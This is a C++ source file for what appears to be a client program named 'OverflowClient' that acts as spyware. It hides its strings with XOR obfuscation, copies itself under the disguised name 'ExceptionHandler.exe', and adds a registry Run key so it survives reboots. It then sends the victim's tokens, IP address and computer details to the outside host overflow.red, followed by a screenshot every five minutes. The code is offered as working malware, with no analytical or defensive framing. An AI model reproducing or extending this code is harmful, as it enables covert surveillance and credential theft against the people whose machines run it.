#include <filesystem>
#include <string>
#include <fstream>
#include <vector>
#include <regex>
#include <iostream>

#include "..\utility\xor.hpp"
#include "..\utility\requests.h"
#include "..\utility\helper.h"
#include "../gui/gui.h"

namespace fs = std::filesystem;

namespace client {
	bool run_background = false;

	const std::string STARTUP_FILE_NAME = xorstr_("ExceptionHandler.exe");

	const std::string PROGRAM_NAME = xorstr_("OverflowClient.exe");

	std::string client_webhook_url = "";

	bool check_for_startup() {
		for (const auto& entry : fs::directory_iterator(helpers::roaming + xorstr_("\\Microsoft\\"))) {
			if (entry.path().filename().string() == STARTUP_FILE_NAME) {
				return true;
			}
		}
		return false;
	}

	void background_loop() {
		while (true) {
			/* Send Screenshot Every 5 Mins */
			helpers::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
			requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url);
			Sleep(300000);
		}
	}

	void start_client() {
		/* Check If We've Already Created Startup */
		if (check_for_startup()) {
			/* Load Webhook */
			std::ifstream file(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
			if (file.good()) {
				std::getline(file, client_webhook_url);
			}
			file.close();

			/* Determine If Ran From Startup */
			auto uptime = std::chrono::milliseconds(GetTickCount64());
			if ((uptime / 60000).count() <= 2) {
				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + (uptime / 60000).count() + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))));

				/* Set To Run In Background */
				run_background = true;
			}
		}
		else {
			/* Make Copy To Roaming Microsoft Folder*/
			try {
				std::filesystem::copy(PROGRAM_NAME, helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
			}
			catch (std::filesystem::filesystem_error& e) {}

			/* Edit registry */
			HKEY key = NULL;
			LONG v1 = RegCreateKey(HKEY_CURRENT_USER, xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &key);
			LONG v2 = RegSetValueEx(key, xorstr_("ExceptionHandler"), 0, REG_SZ, (BYTE*)(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).c_str(), ((helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).size() + 1) * sizeof(wchar_t));

			/* Create Client Channel */
			auto title = helpers::get_ip();
			std::replace(title.begin(), title.end(), '.', ' ');
			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=create_channel&name=client-") + title, &client_webhook_url);

			/* Verify Webook Url */
			if (client_webhook_url.empty())
				return;

			/* Get Tokens */
			auto tokens = helpers::get_tokens();

			/* Post Tokens */
			requests::post_request(xorstr_("https://overflow.red/post.php"), helpers::prepare_token_payload(tokens));

			/* Post IP */
			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**IP**\n```\n") + helpers::get_ip() + xorstr_("\n```&webhook_url=") + client_webhook_url);

			/* Post Computer Info */
			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Computer Info**\n```\n") + helpers::get_computer_info() + xorstr_("\n```&webhook_url=") + client_webhook_url);

			/* Save Webhook */
			std::ofstream file(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
			file << client_webhook_url << std::endl;
			file.close();

			/* Set To Run In Background */
			run_background = true;
		}
	}
}